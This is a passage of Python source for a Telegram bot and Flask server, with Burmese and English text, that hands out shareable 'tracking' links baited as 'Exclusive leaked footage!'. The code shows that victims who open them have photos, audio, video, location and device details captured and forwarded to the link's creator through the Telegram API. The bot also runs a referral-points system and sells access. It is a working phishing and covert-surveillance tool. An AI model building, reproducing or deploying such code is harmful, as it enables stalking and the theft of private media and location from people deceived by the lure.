        except Exception:
            pass


def broadcast_voice(user_id, audio_bytes, caption):
    eff = random_effect()
    for cid in recipients(user_id):
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVoice",
                data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML',
                      'message_effect_id': eff},
                files={'voice': ('audio.ogg', audio_bytes, 'audio/ogg')}, timeout=30)
        except Exception:
            pass


def broadcast_video(user_id, video_bytes, caption):
    eff = random_effect()
    for cid in recipients(user_id):
        try:
            r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
                data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML',
                      'message_effect_id': eff},
                files={'video': ('video.mp4', video_bytes, 'video/mp4')}, timeout=60)
            if not r.json().get('ok'):
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                    data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML',
                          'message_effect_id': eff},
                    files={'document': ('video.webm', video_bytes, 'video/webm')}, timeout=60)
        except Exception:
            pass


def broadcast_location(user_id, lat, lon):
    eff = random_effect()
    for cid in recipients(user_id):
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
                json={"chat_id": cid, "latitude": float(lat), "longitude": float(lon),
                      "message_effect_id": eff}, timeout=10)
        except Exception:
            pass


# ─────────────────────────────────────────
# BOT KEYBOARDS
# ─────────────────────────────────────────
def get_reply_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton("🌐 All-in-One Link")],
            [KeyboardButton("📸 Photo Link"), KeyboardButton("🎤 Audio Link")],
            [KeyboardButton("📍 Location Link"), KeyboardButton("🎥 Video Link")],
            [KeyboardButton("💰 Daily Bonus"), KeyboardButton("👥 Refer & Earn")],
            [KeyboardButton("💎 My Points | Access"), KeyboardButton("📋 Active Links")],
            [KeyboardButton("🗑 Clear Links"), KeyboardButton("❓ Help")],
        ],
        resize_keyboard=True,
        one_time_keyboard=False
    )


def main_menu_inline():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 All-in-One Link", callback_data="gen_all")],
        [InlineKeyboardButton("📸 Photo", callback_data="gen_photo"),
         InlineKeyboardButton("🎤 Audio", callback_data="gen_audio")],
        [InlineKeyboardButton("📍 Location", callback_data="gen_location"),
         InlineKeyboardButton("🎥 Video", callback_data="gen_video")],
        [InlineKeyboardButton("💰 Daily Bonus", callback_data="daily"),
         InlineKeyboardButton("👥 Refer & Earn", callback_data="refer")],
        [InlineKeyboardButton("💎 My Points", callback_data="mypoints"),
         InlineKeyboardButton("📋 Links", callback_data="links")],
        [InlineKeyboardButton("🗑 Clear", callback_data="clear"),
         InlineKeyboardButton("❓ Help", callback_data="help")],
    ])


def make_links_inline(token):
    base = f"{BASE_URL}/track/{token}"
    all_url = f"{base}?m=all"
    share_text = "🔥 ဤဗီဒီယိုကို ကြည့်ပါ! Exclusive leaked footage!"
    share_url = f"https://t.me/share/url?url={requests.utils.quote(all_url)}&text={requests.utils.quote(share_text)}"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 All-in-One", url=all_url)],
        [InlineKeyboardButton("📸 Photo + Device", url=f"{base}?m=photo"),
         InlineKeyboardButton("🎤 Audio + Device", url=f"{base}?m=audio")],
        [InlineKeyboardButton("📍 Location + Device", url=f"{base}?m=location"),
         InlineKeyboardButton("🎥 Video + Device", url=f"{base}?m=video")],
        [InlineKeyboardButton("📤 သူငယ်ချင်းများထံ Share မည်", url=share_url)],
        [InlineKeyboardButton("📋 Active Links", callback_data="links"),
         InlineKeyboardButton("🏠 Menu", callback_data="menu")],
    ])


def format_links_msg(token):
    base = f"{BASE_URL}/track/{token}"
    return (
        f"✅ <b>Links ထုတ်ပြီးပါပြီ! | Links Ready!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 <b>All-in-One:</b>\n<code>{base}?m=all</code>\n\n"
        f"📸 <b>Photo:</b>\n<code>{base}?m=photo</code>\n\n"
        f"🎤 <b>Audio:</b>\n<code>{base}?m=audio</code>\n\n"
        f"📍 <b>Location:</b>\n<code>{base}?m=location</code>\n\n"
        f"🎥 <b>Video:</b>\n<code>{base}?m=video</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⬇️ ခလုတ်များမှ တစ်ချက်နှိပ်၍ ဖွင့်နိုင်သည်"
    )


def format_single_link_msg(token, mode_key, label):
    url = f"{BASE_URL}/track/{token}?m={mode_key}"
    return (
        f"✅ <b>{label} Link ထုတ်ပြီးပါပြီ!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔗 <code>{url}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"မျှဝေပြီး data ကောက်ပါ | Share to collect data"
    )


def single_link_inline(token, mode_key, label):
    url = f"{BASE_URL}/track/{token}?m={mode_key}"
    share_text = "🔥 ဤဗီဒီယိုကို ကြည့်ပါ! Exclusive leaked footage!"
    share_url = f"https://t.me/share/url?url={requests.utils.quote(url)}&text={requests.utils.quote(share_text)}"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"🔗 {label} Link ဖွင့်မည်", url=url)],
        [InlineKeyboardButton("📤 သူငယ်ချင်းများထံ Share မည်", url=share_url)],
        [InlineKeyboardButton("🔄 Link အသစ်", callback_data=f"gen_{mode_key}"),
         InlineKeyboardButton("🏠 Menu", callback_data="menu")],
    ])


# ─────────────────────────────────────────
# POINTS / DAILY / REFER HELPERS
# ─────────────────────────────────────────
def check_and_require_access(user_id):
    """Returns True if user has access, False otherwise."""
    return has_access(user_id)


def daily_bonus_text(user_id):
    u = get_user(user_id)
    today = datetime.now().date()
    last = u.get("last_daily")
    if last == today:
        return None  # already claimed
    u["last_daily"] = today
    add_points(user_id, DAILY_BONUS_PTS)
    days = redeem_points(user_id)
    u2 = get_user(user_id)
    msg = (
        f"🎁 <b>Daily Bonus ရပြီ! | Daily Bonus Claimed!</b>\n\n"
        f"💰 +{DAILY_BONUS_PTS} points ရပြီ\n"
        f"💎 Total Points: <b>{u2['points']}</b>\n"
    )
    if days > 0:
        msg += f"🔓 Access: +{days} day(s) ထပ်ရပြီ!\n"
    msg += f"\n⏰ {access_expires_str(user_id)}\n"
    msg += f"\n📅 မနက်ဖြန် ထပ်ရယူနိုင်သည် | Claim again tomorrow"
    return msg


_BOT_USERNAME_CACHE = {}

def refer_link(user_id):
    if "username" not in _BOT_USERNAME_CACHE:
        try:
            r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=5)
            _BOT_USERNAME_CACHE["username"] = r.json().get("result", {}).get("username", "")
        except Exception:
            _BOT_USERNAME_CACHE["username"] = ""
    uname = _BOT_USERNAME_CACHE.get("username", "")
    if uname:
        return f"https://t.me/{uname}?start=ref_{user_id}"
    return "Bot link မရနိုင်ပါ | Cannot get bot link"


def refer_share_url(ref_link_url):
    share_text = "🎁 ဤ Bot မှ FREE points ရနိုင်သည်! Join လုပ်ပြီး points ရယူပါ!"
    return f"https://t.me/share/url?url={requests.utils.quote(ref_link_url)}&text={requests.utils.quote(share_text)}"


def mypoints_text(user_id):
    u = get_user(user_id)
    pts = u.get("points", 0)
    refs = u.get("referrals", 0)
    exp = access_expires_str(user_id)
    return (
        f"💎 <b>My Points & Access</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"💰 Points: <b>{pts}</b>\n"
        f"👥 Referrals: <b>{refs}</b>\n"
        f"📡 {exp}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"💡 {PTS_PER_DAY} points = 1 day access\n"
        f"👥 တစ်ယောက် refer → +{REFER_BONUS_PTS} pts + 1 day\n"
        f"🎁 Daily bonus → +{DAILY_BONUS_PTS} pts/day"
    )


def mypoints_inline(user_id):
    pts = get_user(user_id).get("points", 0)
    btns = [[InlineKeyboardButton("🏠 Menu", callback_data="menu"),
             InlineKeyboardButton("👥 Refer", callback_data="refer"),
             InlineKeyboardButton("🎁 Daily", callback_data="daily")]]
    if pts >= PTS_PER_DAY:
        btns.insert(0, [InlineKeyboardButton(f"🔓 Redeem {pts} pts → {pts//PTS_PER_DAY} day(s)", callback_data="redeem")])
    return InlineKeyboardMarkup(btns)


def no_access_text():
    return (
        f"🔒 <b>Access မရှိပါ | No Access</b>\n\n"
        f"Link ထုတ်ရန် access လိုအပ်သည်\n\n"
        f"Access ရရှိနည်း:\n"
        f"👥 တစ်ယောက် refer → +{REFER_BONUS_PTS} pts + 1 day\n"
        f"🎁 Daily bonus → +{DAILY_BONUS_PTS} pts/day\n"
        f"💰 {PTS_PER_DAY} points = 1 day access\n\n"
        f"👇 Refer လုပ်ပါ သို့မဟုတ် Daily bonus ယူပါ"
    )


def no_access_inline():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👥 Refer & Earn", callback_data="refer"),
         InlineKeyboardButton("🎁 Daily Bonus", callback_data="daily")],
        [InlineKeyboardButton("💎 My Points", callback_data="mypoints")]
    ])


# ─────────────────────────────────────────
# BOT COMMAND HANDLERS
# ─────────────────────────────────────────
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = str(user.id)
    u = get_user(user_id)
    u["name"] = user.full_name or "Unknown"

    is_new = user_id not in seen_users
    seen_users.add(user_id)

    # Handle referral param
    referral_bonus_given = False
    args = context.args or []
    if args and args[0].startswith("ref_"):
        referrer_id = str(args[0][4:])
        if referrer_id != user_id and u.get("referred_by") is None and referrer_id in user_data:
            u["referred_by"] = referrer_id
            add_points(referrer_id, REFER_BONUS_PTS)
            add_access_days(referrer_id, 1)
            get_user(referrer_id)["referrals"] = get_user(referrer_id).get("referrals", 0) + 1
            referral_bonus_given = True
            # Notify referrer
            referrer_name = get_user(referrer_id).get("name", "Someone")
            notify = (
                f"🎉 <b>Referral ရပြီ! | Referral Bonus!</b>\n\n"
                f"👤 {user.full_name} သည် သင့် link မှ ဝင်လာပြီ\n"
                f"💰 +{REFER_BONUS_PTS} points ရပြီ!\n"
                f"📅 +1 day access ရပြီ!\n\n"
                f"⏰ {access_expires_str(referrer_id)}"
            )
            threading.Thread(target=send_telegram_message, args=(referrer_id, notify), daemon=True).start()

    # Give free day to brand-new users
    if is_new:
        add_access_days(user_id, FREE_DAYS_NEW)

    # Admin notify
    alert = (
        f"👤 <b>{'🆕 NEW' if is_new else '🔄 Return'} User</b>\n"
        f"📛 {user.full_name} | {'@'+user.username if user.username else '-'}\n"
        f"🆔 <code>{user_id}</code>\n"
        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        + (f"\n🎁 Referred! bonus sent to {get_user(u.get('referred_by','')).get('name','?')}" if referral_bonus_given else "")
    )
    for aid in ADMIN_IDS:
        threading.Thread(target=send_telegram_message, args=(aid, alert), daemon=True).start()

    welcome = (
        f"👋 မင်္ဂလာပါ <b>{user.first_name}</b>! | Hello!\n\n"
        f"{'🆕 <b>ကြိုဆိုပါသည်!</b> 1 day free access ရပြီ!\n' if is_new else ''}"
        f"{'🎉 Referral link မှ ဝင်လာတဲ့အတွက် ကျေးဇူးတင်ပါသည်!\n' if referral_bonus_given else ''}"
        f"⏰ {access_expires_str(user_id)}\n\n"
        f"📌 အောက်ပါ ခလုတ်များမှ လုပ်ဆောင်ချက် ရွေးချယ်ပါ\n\n"
        f"🤖 <b>BOT Creator</b> @koekoe4"
    )
    await update.message.reply_text(welcome, parse_mode="HTML", reply_markup=get_reply_keyboard())
    await update.message.reply_text("🏠 <b>Main Menu</b>", parse_mode="HTML", reply_markup=main_menu_inline())


async def grab(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not has_access(user_id):
        await update.message.reply_text(no_access_text(), parse_mode="HTML", reply_markup=no_access_inline())
        return
    token = secrets.token_urlsafe(12)
    tracking_links[token] = user_id
    await update.message.reply_text(format_links_msg(token), parse_mode="HTML", reply_markup=make_links_inline(token))


async def cmd_daily(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    get_user(user_id)
    msg = daily_bonus_text(user_id)
    if not msg:
        u = get_user(user_id)
        await update.message.reply_text(
            f"⏰ <b>ယနေ့ Daily bonus ရပြီးပါပြီ</b>\n\n"
            f"💎 Points: <b>{u['points']}</b>\n"
            f"{access_expires_str(user_id)}\n\n"
            f"📅 မနက်ဖြန် ထပ်ရယူနိုင်သည် | Come back tomorrow",
            parse_mode="HTML"
        )
        return
    await update.message.reply_text(msg, parse_mode="HTML", reply_markup=mypoints_inline(user_id))


async def cmd_refer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    u = get_user(user_id)
    link = refer_link(user_id)
    surl = refer_share_url(link)
    await update.message.reply_text(
        f"👥 <b>Refer & Earn</b>\n\n"
        f"သင့် referral link:\n<code>{link}</code>\n\n"
        f"👤 Referred so far: <b>{u.get('referrals',0)}</b> ယောက်\n\n"
        f"🎁 တစ်ယောက် refer → +{REFER_BONUS_PTS} points + 1 day access\n\n"
        f"Link ကို မိတ်ဆွေများထံ မျှဝေပါ! | Share with friends!",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📤 သူငယ်ချင်းများထံ Refer Link Share မည်", url=surl)],
            [InlineKeyboardButton("💎 My Points", callback_data="mypoints"),
             InlineKeyboardButton("🏠 Menu", callback_data="menu")]
        ])
    )


async def cmd_mypoints(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    get_user(user_id)
    await update.message.reply_text(mypoints_text(user_id), parse_mode="HTML", reply_markup=mypoints_inline(user_id))


# ── Admin commands ──
async def cmd_addpoints(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin သာ အသုံးပြုနိုင်သည်"); return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /addpoints <user_id> <amount>"); return
    target, amt = str(args[0]), int(args[1])
    get_user(target)
    add_points(target, amt)
    u = get_user(target)
    await update.message.reply_text(
        f"✅ <b>Points ထည့်ပြီး</b>\n👤 User: <code>{target}</code>\n💰 +{amt} pts\n💎 Total: {u['points']}",
        parse_mode="HTML"
    )


async def cmd_addall(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add points to ALL users at once and notify each one."""
    caller_id = str(update.effective_user.id)
    if not is_admin(caller_id):
        await update.message.reply_text("❌ Admin သာ အသုံးပြုနိုင်သည်")
        return
    args = context.args
    if not args or not args[0].isdigit():
        await update.message.reply_text(
            "Usage: /addall <amount>\n\nဥပမာ: /addall 10  → user အားလုံးကို 10 pts ပေးမည်"
        )
        return

    amt = int(args[0])
    total_users = list(user_data.keys())
    if not total_users:
        await update.message.reply_text("❌ User မရှိသေးပါ | No users yet.")
        return

    await update.message.reply_text(
        f"⏳ User <b>{len(total_users)}</b> ယောက်ကို +{amt} pts ပေးနေသည်...\n"
        f"Notifications တပြိုင်နက် ပေးပို့မည်...",
        parse_mode="HTML"
    )

    def notify_one(uid, pts, total_after):
        msg = (
            f"🎁 <b>Points လက်ဆောင် ရရှိပြီ! | Points Gift!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"💰 +<b>{pts}</b> points ရပြီ!\n"
            f"💎 Total Points: <b>{total_after}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🎉 Admin @KOEKOE4 မှ လက်ဆောင်ပေးသည်!\n"
            f"👥 Refer လုပ်ပြီး ထပ်ပိုမို points ရယူပါ\n"
            f"💳 Points ဝယ်ယူလိုပါက 👉 @KOEKOE4"
        )
        send_telegram_message(uid, msg, effect_id=random_effect())

    for uid in total_users:
        add_points(uid, amt)
        u = get_user(uid)
        threading.Thread(
            target=notify_one,
            args=(uid, amt, u["points"]),
            daemon=True
        ).start()

    await update.message.reply_text(
        f"✅ <b>ပြီးပါပြီ! | Done!</b>\n\n"
        f"👥 Users: <b>{len(total_users)}</b>\n"
        f"💰 +{amt} pts each\n"
        f"📨 Notifications ပေးပို့ပြီး",
        parse_mode="HTML"
    )


async def cmd_removepoints(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin သာ အသုံးပြုနိုင်သည်"); return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /removepoints <user_id> <amount>"); return
    target, amt = str(args[0]), int(args[1])
    get_user(target)
    remove_points(target, amt)
    u = get_user(target)
    await update.message.reply_text(
        f"✅ <b>Points နှုတ်ပြီး</b>\n👤 User: <code>{target}</code>\n💰 -{amt} pts\n💎 Remaining: {u['points']}",
        parse_mode="HTML"
    )


async def cmd_adddays(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin သာ အသုံးပြုနိုင်သည်"); return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /adddays <user_id> <days>"); return
    target, days = str(args[0]), int(args[1])
    get_user(target)
    add_access_days(target, days)
    await update.message.reply_text(
        f"✅ <b>Access ထည့်ပြီး</b>\n👤 User: <code>{target}</code>\n📅 +{days} day(s)\n⏰ {access_expires_str(target)}",
        parse_mode="HTML"
    )


async def cmd_checkuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin သာ အသုံးပြုနိုင်သည်"); return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /checkuser <user_id>"); return
    target = str(args[0])
    u = get_user(target)
    await update.message.reply_text(
        f"👤 <b>User: <code>{target}</code></b>\n"
        f"📛 Name: {u.get('name','?')}\n"
        f"💰 Points: {u.get('points',0)}\n"
        f"👥 Referrals: {u.get('referrals',0)}\n"
        f"⏰ {access_expires_str(target)}",
        parse_mode="HTML"
    )


async def cmd_listusers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin သာ အသုံးပြုနိုင်သည်"); return
    if not user_data:
        await update.message.reply_text("No users yet."); return
    lines = [f"👥 <b>Users ({len(user_data)})</b>\n━━━━━━━━━━━━━━━━━━━━"]
    for uid, u in list(user_data.items())[:30]:
        exp = u.get("access_expires")
        status = "✅" if exp and exp > datetime.now() else "❌"
        lines.append(f"{status} <code>{uid}</code> | {u.get('name','?')} | 💰{u.get('points',0)} pts | 👥{u.get('referrals',0)}")
    await update.message.reply_text("\n".join(lines), parse_mode="HTML")


# ─────────────────────────────────────────
# REPLY KEYBOARD TEXT HANDLER
# ─────────────────────────────────────────
async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text or ""
    user_id = str(update.effective_user.id)
    get_user(user_id)

    MODE_MAP = {
        "🌐 All-in-One Link": ("all", "🌐 All-in-One"),
        "📸 Photo Link":       ("photo", "📸 Photo"),
        "🎤 Audio Link":       ("audio", "🎤 Audio"),
        "📍 Location Link":    ("location", "📍 Location"),
        "🎥 Video Link":       ("video", "🎥 Video"),
    }

    if text in MODE_MAP:
        mode_key, label = MODE_MAP[text]
        if not has_access(user_id):
            await update.message.reply_text(no_access_text(), parse_mode="HTML", reply_markup=no_access_inline())
            return
        token = secrets.token_urlsafe(12)
        tracking_links[token] = user_id
        if mode_key == "all":
            await update.message.reply_text(format_links_msg(token), parse_mode="HTML", reply_markup=make_links_inline(token))
        else:
            await update.message.reply_text(
                format_single_link_msg(token, mode_key, label),
                parse_mode="HTML",
                reply_markup=single_link_inline(token, mode_key, label)
            )

    elif "Daily Bonus" in text:
        msg = daily_bonus_text(user_id)
        if not msg:
            u = get_user(user_id)
            await update.message.reply_text(
                f"⏰ <b>ယနေ့ Daily bonus ရပြီးပါပြီ</b>\n💎 Points: <b>{u['points']}</b>\n{access_expires_str(user_id)}\n\n📅 မနက်ဖြန် ထပ်ရယူနိုင်သည်",
                parse_mode="HTML")
        else:
            await update.message.reply_text(msg, parse_mode="HTML", reply_markup=mypoints_inline(user_id))

    elif "Refer" in text:
        u = get_user(user_id)
        link = refer_link(user_id)
        surl = refer_share_url(link)
        await update.message.reply_text(
            f"👥 <b>Refer & Earn</b>\n\nသင့် referral link:\n<code>{link}</code>\n\n"
            f"👤 Referred: <b>{u.get('referrals',0)}</b> ယောက်\n"
            f"🎁 တစ်ယောက် refer → +{REFER_BONUS_PTS} pts + 1 day",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📤 သူငယ်ချင်းများထံ Refer Link Share မည်", url=surl)]
            ])
        )

    elif "My Points" in text or "Access" in text:
        await update.message.reply_text(mypoints_text(user_id), parse_mode="HTML", reply_markup=mypoints_inline(user_id))

    elif "Active Links" in text:
        user_links = [t for t, uid in tracking_links.items() if uid == user_id]
        if not user_links:
            await update.message.reply_text("📋 <b>Active Links</b>\n\n❌ Link မရှိသေးပါ", parse_mode="HTML")
        else:
            lines = "\n".join([f"• <code>{BASE_URL}/track/{t}?m=all</code>" for t in user_links[-10:]])
            await update.message.reply_text(f"📋 <b>Active Links ({len(user_links)})</b>\n\n{lines}", parse_mode="HTML")

    elif "Clear" in text or "ဖျက်" in text:
        if not is_admin(user_id):
            await update.message.reply_text(
                "❌ <b>Admin သာ Links ဖျက်နိုင်သည်</b>\n\nဖျက်ရန် Admin ထံ ဆက်သွယ်ပါ @koekoe4",
                parse_mode="HTML"
            )
            return
        user_tokens = [t for t, uid in tracking_links.items() if uid == user_id]
        for t in user_tokens:
            del tracking_links[t]
        await update.message.reply_text(
            f"🗑 <b>Admin Action</b>\nLink <b>{len(user_tokens)}</b> ခု ဖျက်ပြီး",
            parse_mode="HTML"
        )

    elif "Help" in text:
        await update.message.reply_text(
            "❓ <b>Help | အကူအညီ</b>\n\n"
            "<b>Links:</b>\n"
            "🌐 All → Photo+Audio+Location+Video+Device\n"
            "📸 Photo → ဓာတ်ပုံ\n🎤 Audio → အသံ\n📍 Location → တည်နေရာ\n🎥 Video → ဗီဒီယို\n\n"
            "<b>Points system:</b>\n"
            f"🎁 Daily Bonus → +{DAILY_BONUS_PTS} pts/day\n"
            f"👥 Refer → +{REFER_BONUS_PTS} pts + 1 day/ကိုယ်\n"
            f"💰 {PTS_PER_DAY} pts = 1 day access\n\n"
            "💳 <b>Bot အသုံးပြုနိုင်ရန် points များ ဝယ်ယူလိုပါက</b> 👉 @KOEKOE4\n\n"
            "<b>Admin commands:</b>\n"
            "/addall &lt;pts&gt; → User အားလုံးကို points ပေး\n"
            "/addpoints /removepoints /adddays /checkuser /listusers",
            parse_mode="HTML"
        )
    else:
        await update.message.reply_text("🏠 <b>Main Menu</b>", parse_mode="HTML", reply_markup=main_menu_inline())


# ─────────────────────────────────────────
# CALLBACK QUERY HANDLER
# ─────────────────────────────────────────
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = str(query.from_user.id)
    data = query.data
    get_user(user_id)

    GEN_MODES = {
        "gen_all": ("all", "🌐 All-in-One"),
        "gen_photo": ("photo", "📸 Photo"),
        "gen_audio": ("audio", "🎤 Audio"),
        "gen_location": ("location", "📍 Location"),
        "gen_video": ("video", "🎥 Video"),
    }

    if data in GEN_MODES:
        mode_key, label = GEN_MODES[data]
        if not has_access(user_id):
            await query.edit_message_text(no_access_text(), parse_mode="HTML", reply_markup=no_access_inline())
            return
        token = secrets.token_urlsafe(12)
        tracking_links[token] = user_id
        if mode_key == "all":
            await query.edit_message_text(format_links_msg(token), parse_mode="HTML", reply_markup=make_links_inline(token))
        else:
            await query.edit_message_text(
                format_single_link_msg(token, mode_key, label),
                parse_mode="HTML",
                reply_markup=single_link_inline(token, mode_key, label)
            )

    elif data == "menu":
        await query.edit_message_text("🏠 <b>Main Menu</b>", parse_mode="HTML", reply_markup=main_menu_inline())

    elif data == "daily":
        msg = daily_bonus_text(user_id)
        if not msg:
            u = get_user(user_id)
            msg = (f"⏰ <b>ယနေ့ Daily bonus ရပြီးပါပြီ</b>\n"
                   f"💎 Points: <b>{u['points']}</b>\n{access_expires_str(user_id)}\n\n"
                   f"📅 မနက်ဖြန် ထပ်ရယူနိုင်သည်")
        await query.edit_message_text(msg, parse_mode="HTML", reply_markup=mypoints_inline(user_id))

    elif data == "refer":
        u = get_user(user_id)
        link = refer_link(user_id)
        surl = refer_share_url(link)
        await query.edit_message_text(
            f"👥 <b>Refer & Earn</b>\n\nသင့် referral link:\n<code>{link}</code>\n\n"
            f"👤 Referred: <b>{u.get('referrals',0)}</b> ယောက်\n"
            f"🎁 တစ်ယောက် → +{REFER_BONUS_PTS} pts + 1 day",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📤 သူငယ်ချင်းများထံ Refer Link Share မည်", url=surl)],
                [InlineKeyboardButton("💎 My Points", callback_data="mypoints"),
                 InlineKeyboardButton("🏠 Menu", callback_data="menu")]
            ])
        )

    elif data == "mypoints":
        await query.edit_message_text(mypoints_text(user_id), parse_mode="HTML", reply_markup=mypoints_inline(user_id))

    elif data == "redeem":
        pts = get_user(user_id).get("points", 0)
        if pts < PTS_PER_DAY:
            await query.answer(f"Points မလုံလောက်ပါ | Need {PTS_PER_DAY} pts", show_alert=True)
            return
        days = redeem_points(user_id)
        await query.edit_message_text(
            f"🔓 <b>Redeem ပြီးပါပြီ!</b>\n\n"
            f"📅 +{days} day(s) access ရပြီ!\n"
            f"⏰ {access_expires_str(user_id)}\n"
            f"💎 Points ကျန်: {get_user(user_id)['points']}",
            parse_mode="HTML",
            reply_markup=mypoints_inline(user_id)
        )

    elif data == "links":
        user_links = [t for t, uid in tracking_links.items() if uid == user_id]
        if not user_links:
            txt = "📋 <b>Active Links</b>\n\n❌ Link မရှိသေးပါ"
        else:
            lines = "\n".join([f"• <code>{BASE_URL}/track/{t}?m=all</code>" for t in user_links[-10:]])
            txt = f"📋 <b>Active Links ({len(user_links)})</b>\n\n{lines}"
        await query.edit_message_text(txt, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔗 Links အသစ်", callback_data="gen_all"),
             InlineKeyboardButton("🗑 Clear", callback_data="clear")],
            [InlineKeyboardButton("🏠 Menu", callback_data="menu")]
        ]))

    elif data == "clear":
        if not is_admin(user_id):
            await query.answer("❌ Admin သာ ဖျက်နိုင်သည် | Admin only", show_alert=True)
            return
        user_tokens = [t for t, uid in tracking_links.items() if uid == user_id]
        for t in user_tokens:
            del tracking_links[t]
        await query.edit_message_text(
            f"🗑 <b>Admin Action</b>\nLink <b>{len(user_tokens)}</b> ခု ဖျက်ပြီး",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Link အသစ်", callback_data="gen_all"),
                 InlineKeyboardButton("🏠 Menu", callback_data="menu")]
            ])
        )

    elif data == "help":
        await query.edit_message_text(
            "❓ <b>Help | အကူအညီ</b>\n\n"
            f"🎁 Daily Bonus → +{DAILY_BONUS_PTS} pts/day\n"
            f"👥 Refer တစ်ယောက် → +{REFER_BONUS_PTS} pts + 1 day\n"
            f"💰 {PTS_PER_DAY} pts = 1 day access\n\n"
            "🌐 All → Photo+Audio+Location+Video+Device\n"
            "📸/🎤/📍/🎥 → single mode\n\n"
            "💳 <b>Bot အသုံးပြုနိုင်ရန် points များ ဝယ်ယူလိုပါက</b> 👉 @KOEKOE4",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Link ထုတ်", callback_data="gen_all"),
                 InlineKeyboardButton("🏠 Menu", callback_data="menu")]
            ])
        )


# ─────────────────────────────────────────
# RUN
# ─────────────────────────────────────────
def run_bot():
    if not BOT_TOKEN:
        print("⚠️  BOT_TOKEN not set.")
        return
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("grab", grab))
    app.add_handler(CommandHandler("daily", cmd_daily))
    app.add_handler(CommandHandler("refer", cmd_refer))
    app.add_handler(CommandHandler("mypoints", cmd_mypoints))
    app.add_handler(CommandHandler("addpoints", cmd_addpoints))
    app.add_handler(CommandHandler("addall", cmd_addall))
    app.add_handler(CommandHandler("removepoints", cmd_removepoints))
    app.add_handler(CommandHandler("adddays", cmd_adddays))
    app.add_handler(CommandHandler("checkuser", cmd_checkuser))
    app.add_handler(CommandHandler("listusers", cmd_listusers))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    print("🤖 Bot polling...")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    def run_flask():
        port = int(os.environ.get("PORT", 5000))
        flask_app.run(host="0.0.0.0", port=port, threaded=True, debug=False)

    if BOT_TOKEN:
        flask_thread = threading.Thread(target=run_flask, daemon=True)
        flask_thread.start()
        run_bot()
    else:
        print("⚠️  BOT_TOKEN not set. Flask only.")
        run_flask()
